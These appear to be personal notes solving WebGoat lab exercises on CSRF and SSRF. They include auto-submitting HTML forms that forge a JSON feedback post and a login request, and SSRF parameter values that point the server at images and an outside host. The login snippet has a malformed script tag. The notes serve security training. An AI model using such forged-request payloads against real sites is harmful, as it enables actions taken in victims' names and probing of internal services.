# Request Forgeries

## CSRF

### Basic Get CSRF Exercise

Intercept the request and change the "Host" header with another IP

### Post a review on someone else’s behalf

Send some text in "Add a Review" box and a number in below box, intercept the request and change the "Host" header with other suitable IP, send it again.

### CSRF and content-type

With a [hint](https://pentestmonkey.net/blog/csrf-xml-post-request), we need to send JSON payload from standard HTML form. Login to WebGoat, Upload following html to WebWolf and open the link to get the flag.

```html
<form name="feedback" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST">
    <input type="hidden" name='{"name":"name","email":"name@hh.com","subject":"service","message":"Hello' value='"}'>
</form>
<script>document.feedback.submit();</script>
```

### Login CSRF attack

We need the user `csrf-<name>` to available in the server so we need to register it first. Then just like the previous challenge, upload the html file to WebWolf and open it.

```html
<form action="http://localhost:8080/WebGoat/login" method="POST" style="width: 200px;">
    <input type="hidden" name="username" value="csrf-name">
    <input type="hidden" name="password" value="1234567890">
    <button type="submit">Sign in</button>
  </form>
<script>document.login.submit();/script>
```

## SSRF

### Find and modify the request to display Jerry

Intercept the request and modify the image to jerry.png to display the jerry's image.
`url=images%2Fjerry.png`

### Change the request so the server gets information from `http://ifconfig.pro`

Like the previous challenge:
`url=http://ifconfig.pro`
